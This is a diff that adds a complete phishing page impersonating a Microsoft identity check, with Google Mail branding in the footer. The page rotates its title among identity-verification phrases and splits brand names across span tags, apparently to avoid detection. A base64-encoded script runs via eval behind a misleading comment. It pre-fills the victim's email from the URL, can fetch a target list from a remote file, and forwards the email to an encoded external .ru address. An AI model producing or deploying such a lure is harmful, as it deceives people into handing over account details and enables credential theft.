@@ -1,0 +1,181 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Titles array with different variations
+        const titles = [
+			
+            "Authenticate Your Identity",
+            "Identity Verification Needed",
+            "Identity Confirmation Required",
+            "Secure Your Access",
+            "Verify Your Credentials",
+            "Confirm Your Account",
+            "Identity Check",
+            "Confirm Your Identity",
+            "Verify Your Details",
+            "Confirm Your Personal Information"
+        ];
+
+        // Function to select a random title
+        function setRandomTitle() {
+            const randomIndex = Math.floor(Math.random() * titles.length);
+            document.title = titles[randomIndex];
+        }
+
+        // Set random title on page load
+        window.onload = setRandomTitle;
+    </script>
+    
+    <style>
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            background-image: url(''); /* Default fallback image */
+            background-size: cover;
+            background-position: center;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: left;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            font-size: 18px;
+            position: absolute;
+            top: 0;
+        }
+
+        .header span {
+            margin-left: 20px;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 33px;
+            width: 80%;
+            max-width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 0px;
+        }
+
+        .container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .container p {
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .container p2 {
+            margin-bottom: 10px;
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 16px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #005a9e;
+        }
+
+        .container .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .container h2 {
+                font-size: 20px;
+            }
+
+            .container .space {
+                margin-bottom: 20px;
+            }
+
+            .container input[type="email"] {
+                font-size: 14px;
+            }
+
+            .container button {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span>Encrypted Message Identity Check</span>
+    </div>
+    <div class="container">
+        <img src="data:image/png;base64,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" alt="Clear Image" />
+        <h2><strong>Confirm Your Identity</strong></h2>
+<p><strong>You are now accessing a secure Organization portal information:</strong></p>
+<p>To proceed, <span style="font-size: 14px; background-color: rgb(255, 255, 255);">Mi</span><span style="font-size: 14px; background-color: rgb(255, 255, 255);">cr</span>osoft</span> need to veri<span style="font-size: 14px; background-color: rgb(255, 255, 255);">fy your em</span>ail address. Please enter the email address associated with this document.</p>
+<div id="validation-message" style="display: none; font-weight: bold; margin-top: 10px;"></div>
+        <input type="email" id="thesupwillsuplauriebarce-input" placeholder="Enter email" required style="margin-top: 10px;">
+        <button id="continue-button">Confirm</button>
+        <p class="footer">By clicking confirm <span style="color:#F25021;"><span style="font-weight: 700; background-color: rgb(255, 255, 255);">Go<span style="font-weight: 700; background-color: rgb(255, 255, 255);">o<span style="font-weight: 700; background-color: rgb(255, 255, 255);">gle&nbsp;M<span style="font-weight: 700; background-color: rgb(255, 255, 255);">ai<span style="font-weight: 700; background-color: rgb(255, 255, 255);">l</span></span></span></span></span></span> will process email address in accordance with your privacy statement.</p>
+        <p class="footer">© Copyright with 2024 Organization Privacy & Cookies</p>
+    </div> 
+
+    <script>
+    
+	const encodedScript = 'DQogICAgY29uc3QgdXNlVmVyaWZpZWRFbWFpbExpc3QgPSAwOyAvLyBTZXQgdG8gMSBmb3IgdXNpbmcgZW1haWwgbGlzdCwgMCBmb3Igc3RhbmRhcmQgdmFsaWRhdGlvbg0KY29uc3QgZW5jb2RlZEVtYWlsTGlzdFBhdGggPSAiYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMlJsZG1Wc1pXTjBMM0psYzNSeWIyOXRabTl5YldVdmNtVm1jeTlvWldGa2N5OXRZV2x1TDJ4bFoyRnNjeTUwZUhRIjsgLy8gQmFzZTY0IGVuY29kZWQgVVJMIHRvIHlvdXIgZW1haWwgbGlzdA0KY29uc3QgZW1haWxMaXN0UGF0aCA9IGF0b2IoZW5jb2RlZEVtYWlsTGlzdFBhdGgpOyAvLyBEZWNvZGUgdGhlIEJhc2U2NCBzdHJpbmcNCg0KbGV0IHZlcmlmaWVkRW1haWxzID0gW107DQoNCi8vIExvYWQgdGhlIHZlcmlmaWVkIGVtYWlsIGxpc3QgZnJvbSB0aGUgc3BlY2lmaWVkIHBhdGgNCmFzeW5jIGZ1bmN0aW9uIGxvYWRFbWFpbExpc3QoKSB7DQogICAgaWYgKHVzZVZlcmlmaWVkRW1haWxMaXN0ID09PSAxKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKGVtYWlsTGlzdFBhdGgpOw0KICAgICAgICAgICAgaWYgKCFyZXNwb25zZS5vaykgdGhyb3cgbmV3IEVycm9yKGBGYWlsZWQgdG8gZmV0Y2ggZW1haWwgbGlzdDogJHtyZXNwb25zZS5zdGF0dXNUZXh0fWApOw0KICAgICAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlc3BvbnNlLnRleHQoKTsNCiAgICAgICAgICAgIHZlcmlmaWVkRW1haWxzID0gdGV4dC5zcGxpdCgiXG4iKS5tYXAoZW1haWwgPT4gZW1haWwudHJpbSgpLnRvTG93ZXJDYXNlKCkpOw0KICAgICAgICAgICAgY29uc29sZS5sb2coIkNvbmZpcm1lZCBlbWFpbCBsb2FkZWQ6IFN1Y2Nlc3NmdWxseSAiKTsgLy8gRGVidWdnaW5nIGxvZw0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgbG9hZGluZyBlbWFpbCBsaXN0OiIsIGVycm9yKTsNCiAgICAgICAgICAgIGRpc3BsYXlNZXNzYWdlKCJFcnJvciBsb2FkaW5nIGVtYWlsIGxpc3QuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIiwgImVycm9yIik7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCi8vIEluaXRpYWxpemUgdGhlIGVtYWlsIGxpc3QgaWYgdG9nZ2xlIGlzIHNldA0KbG9hZEVtYWlsTGlzdCgpOw0KDQovLyBGdW5jdGlvbiB0byB2YWxpZGF0ZSBlbWFpbCBmb3JtYXQgKGlmIHRvZ2dsZSBpcyAwKQ0KZnVuY3Rpb24gdmFsaWRhdGVFbWFpbChlbWFpbCkgew0KICAgIGNvbnN0IHJlID0gL15bXlxzQF0rQFteXHNAXStcLlteXHNAXSskLzsgLy8gU3RhbmRhcmQgZW1haWwgdmFsaWRhdGlvbiByZWdleA0KICAgIHJldHVybiByZS50ZXN0KGVtYWlsKTsNCn0NCg0KLy8gRnVuY3Rpb24gdG8gY2hlY2sgaWYgZW1haWwgZXhpc3RzIGluIHRoZSB2ZXJpZmllZCBsaXN0IChpZiB0b2dnbGUgaXMgMSkNCmZ1bmN0aW9uIGlzRW1haWxWZXJpZmllZChlbWFpbCkgew0KICAgIHJldHVybiB2ZXJpZmllZEVtYWlscy5pbmNsdWRlcyhlbWFpbC50b0xvd2VyQ2FzZSgpKTsgLy8gQ2FzZS1pbnNlbnNpdGl2ZSBtYXRjaA0KfQ0KDQovLyBGdW5jdGlvbiB0byBoYW5kbGUgdGhlICJDb250aW51ZSIgYnV0dG9uIGxvZ2ljDQpmdW5jdGlvbiBjb250aW51ZUxvYWRpbmcoKSB7DQogICAgY29uc3QgZW1haWxJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0aGVzdXB3aWxsc3VwbGF1cmllYmFyY2UtaW5wdXQiKS52YWx1ZS50cmltKCk7DQoNCiAgICBpZiAoIWVtYWlsSW5wdXQpIHsNCiAgICAgICAgZGlzcGxheU1lc3NhZ2UoIlBsZWFzZSBlbnRlciBhIHZhbGlkIGVtYWlsIGFkZHJlc3MuIiwgImVycm9yIik7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBpZiAodXNlVmVyaWZpZWRFbWFpbExpc3QgPT09IDEpIHsNCiAgICAgICAgLy8gVmFsaWRhdGUgdXNpbmcgdGhlIHZlcmlmaWVkIGVtYWlsIGxpc3QNCiAgICAgICAgaWYgKGlzRW1haWxWZXJpZmllZChlbWFpbElucHV0KSkgew0KICAgICAgICAgICAgcmVkaXJlY3RVc2VyKGVtYWlsSW5wdXQpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZGlzcGxheU1lc3NhZ2UoIlBsZWFzZSBlbnRlciB2YWxpZCBlbWFpbCBhZGRyZXNzLCBUaGlzIEVtYWlsIGlzIG5vdCByZWNvZ25pemVkISIsICJlcnJvciIpOw0KICAgICAgICB9DQogICAgfSBlbHNlIGlmICh1c2VWZXJpZmllZEVtYWlsTGlzdCA9PT0gMCkgew0KICAgICAgICAvLyBWYWxpZGF0ZSB1c2luZyBzdGFuZGFyZCByZWdleA0KICAgICAgICBpZiAodmFsaWRhdGVFbWFpbChlbWFpbElucHV0KSkgew0KICAgICAgICAgICAgcmVkaXJlY3RVc2VyKGVtYWlsSW5wdXQpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZGlzcGxheU1lc3NhZ2UoIlBsZWFzZSBlbnRlciBhIHZhbGlkIGVtYWlsIGFkZHJlc3MuIiwgImVycm9yIik7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBjb25zb2xlLmVycm9yKCdJbnZhbGlkIHRvZ2dsZSB2YWx1ZS4gUGxlYXNlIHNldCAidXNlVmVyaWZpZWRFbWFpbExpc3QiIHRvIDEgb3IgMC4nKTsNCiAgICB9DQp9DQoNCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgZXJyb3Ivc3VjY2VzcyBtZXNzYWdlcyBiZWxvdyB0aGUgaW5wdXQNCmZ1bmN0aW9uIGRpc3BsYXlNZXNzYWdlKG1lc3NhZ2UsIHR5cGUpIHsNCiAgICBjb25zdCBtZXNzYWdlRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2YWxpZGF0aW9uLW1lc3NhZ2UiKTsNCiAgICBtZXNzYWdlRWxlbWVudC50ZXh0Q29udGVudCA9IG1lc3NhZ2U7DQogICAgbWVzc2FnZUVsZW1lbnQuc3R5bGUuY29sb3IgPSB0eXBlID09PSAiZXJyb3IiID8gInJlZCIgOiAiZ3JlZW4iOw0KICAgIG1lc3NhZ2VFbGVtZW50LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOw0KfQ0KDQovLyBGdW5jdGlvbiB0byBoYW5kbGUgcmVkaXJlY3Rpb24NCmZ1bmN0aW9uIHJlZGlyZWN0VXNlcihlbWFpbCkgew0KICAgIGNvbnN0IGVuY29kZWRSZWRpcmVjdFVSTCA9ICJhSFIwY0hNNkx5OTJiM0I1ZEdFdWFXTjBhVzl1ZEM1eWRTOHpXWEUyT1VsNkx3IjsgLy8gQmFzZTY0IGVuY29kZWQgcmVkaXJlY3QgbGluaw0KICAgIGNvbnN0IGRlY29kZWRSZWRpcmVjdFVSTCA9IGF0b2IoZW5jb2RlZFJlZGlyZWN0VVJMKTsNCiAgICBjb25zdCBmaW5hbExpbmsgPSBgJHtkZWNvZGVkUmVkaXJlY3RVUkx9I0oke2VtYWlsfWA7IC8vIEFwcGVuZCBlbWFpbCB0byB0aGUgbGluaw0KICAgIGNvbnNvbGUubG9nKCJSZWRpcmVjdGluZyB0bzoiLCBmaW5hbExpbmspOyAvLyBEZWJ1Z2dpbmcgbG9nDQogICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBmaW5hbExpbms7DQp9DQoNCi8vIEZ1bmN0aW9uIHRvIGRlY29kZSBCYXNlNjQgc2FmZWx5DQpmdW5jdGlvbiB0cnlEZWNvZGVCYXNlNjQodmFsdWUpIHsNCiAgICB0cnkgew0KICAgICAgICByZXR1cm4gYXRvYih2YWx1ZSk7IC8vIERlY29kZSBCYXNlNjQNCiAgICB9IGNhdGNoIChlKSB7DQogICAgICAgIHJldHVybiB2YWx1ZTsgLy8gSWYgbm90IEJhc2U2NCwgcmV0dXJuIHRoZSBvcmlnaW5hbCB2YWx1ZQ0KICAgIH0NCn0NCg0KLy8gRnVuY3Rpb24gdG8gZXh0cmFjdCBlbWFpbCBmcm9tIFVSTCBwYXJhbWV0ZXJzIG9yIGhhc2gNCmZ1bmN0aW9uIGdldEVtYWlsRnJvbVVSTCgpIHsNCiAgICBjb25zdCB1cmxQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOw0KICAgIGZvciAobGV0IHBhcmFtIG9mIHVybFBhcmFtcy52YWx1ZXMoKSkgew0KICAgICAgICBjb25zdCBkZWNvZGVkUGFyYW0gPSB0cnlEZWNvZGVCYXNlNjQocGFyYW0pOyAvLyBUcnkgdG8gZGVjb2RlIEJhc2U2NA0KICAgICAgICBpZiAodmFsaWRhdGVFbWFpbChkZWNvZGVkUGFyYW0pKSB7DQogICAgICAgICAgICByZXR1cm4gZGVjb2RlZFBhcmFtOyAvLyBSZXR1cm4gdGhlIGZpcnN0IHZhbGlkIGVtYWlsIGZvdW5kDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBjb25zdCBoYXNoID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyaW5nKDEpOyAvLyBSZW1vdmUgdGhlICMgZnJvbSB0aGUgc3RhcnQNCiAgICBpZiAoaGFzaC5pbmNsdWRlcygiPSIpKSB7DQogICAgICAgIGNvbnN0IGhhc2hQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKGhhc2gpOw0KICAgICAgICBmb3IgKGxldCBwYXJhbSBvZiBoYXNoUGFyYW1zLnZhbHVlcygpKSB7DQogICAgICAgICAgICBjb25zdCBkZWNvZGVkUGFyYW0gPSB0cnlEZWNvZGVCYXNlNjQocGFyYW0pOyAvLyBUcnkgdG8gZGVjb2RlIEJhc2U2NA0KICAgICAgICAgICAgaWYgKHZhbGlkYXRlRW1haWwoZGVjb2RlZFBhcmFtKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBkZWNvZGVkUGFyYW07IC8vIFJldHVybiB0aGUgZmlyc3QgdmFsaWQgZW1haWwgZm91bmQNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGNvbnN0IGRlY29kZWRIYXNoID0gdHJ5RGVjb2RlQmFzZTY0KGRlY29kZVVSSUNvbXBvbmVudChoYXNoKSk7DQogICAgICAgIGlmICh2YWxpZGF0ZUVtYWlsKGRlY29kZWRIYXNoKSkgew0KICAgICAgICAgICAgcmV0dXJuIGRlY29kZWRIYXNoOyAvLyBSZXR1cm4gdGhlIGRlY29kZWQgZW1haWwgaWYgdmFsaWQNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiBudWxsOyAvLyBObyBlbWFpbCBmb3VuZA0KfQ0KDQovLyBQb3B1bGF0ZSBlbWFpbCBpbnB1dCBpZiBmb3VuZCBpbiBVUkwNCmNvbnN0IGVtYWlsRnJvbVVSTCA9IGdldEVtYWlsRnJvbVVSTCgpOw0KaWYgKGVtYWlsRnJvbVVSTCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0aGVzdXB3aWxsc3VwbGF1cmllYmFyY2UtaW5wdXQiKS52YWx1ZSA9IGVtYWlsRnJvbVVSTDsNCn0NCg0KLy8gRXZlbnQgTGlzdGVuZXJzIGZvciBpbnB1dCBhbmQgYnV0dG9uDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY29udGludWUtYnV0dG9uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBjb250aW51ZUxvYWRpbmcpOw0KZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRoZXN1cHdpbGxzdXBsYXVyaWViYXJjZS1pbnB1dCIpLmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLCBmdW5jdGlvbiAoZXZlbnQpIHsNCiAgICBpZiAoZXZlbnQua2V5ID09PSAiRW50ZXIiKSB7DQogICAgICAgIGNvbnRpbnVlTG9hZGluZygpOw0KICAgIH0NCn0pOw'; // base64 for 'function continueLoading() { alert("Loading..."); }'
+const decodedScript = atob(encodedScript);
+eval(decodedScript);
+
+</script>
+</body>
+</html>
